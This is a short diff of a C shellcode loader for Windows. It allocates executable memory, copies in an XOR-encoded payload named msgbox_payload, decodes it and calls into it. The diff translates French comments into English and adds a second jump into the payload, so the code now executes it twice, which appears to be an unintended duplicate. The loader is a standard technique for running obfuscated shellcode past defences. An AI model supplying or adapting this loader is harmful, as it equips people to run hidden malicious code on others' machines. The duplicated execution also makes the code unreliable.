@@ -23,14 +23,14 @@ void main() {
     printf("Key size: %zu\n", k_len);
     printf("Shellcode size: %zu\n", ss);
 
-    // Allouer une mémoire exécutable
+    // Allocating executable memory
     void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!exec_mem) {
         printf("Erreur: Impossible d'allouer la mémoire (%lu)\n", GetLastError());
         return;
     }
 
-    // Copier le shellcode dans cette mémoire
+    // Copy shellcode into allocated memory
     memcpy(exec_mem, msgbox_payload, ss);
 
     if (k_len != 0) {
@@ -38,6 +38,9 @@ void main() {
             ((unsigned char*)exec_mem)[i] ^= k[i % k_len];
         }
     }
+
+    // jump on it
+    ((void (*)())exec_mem)();
 
     ((void (*)())exec_mem)();
 }
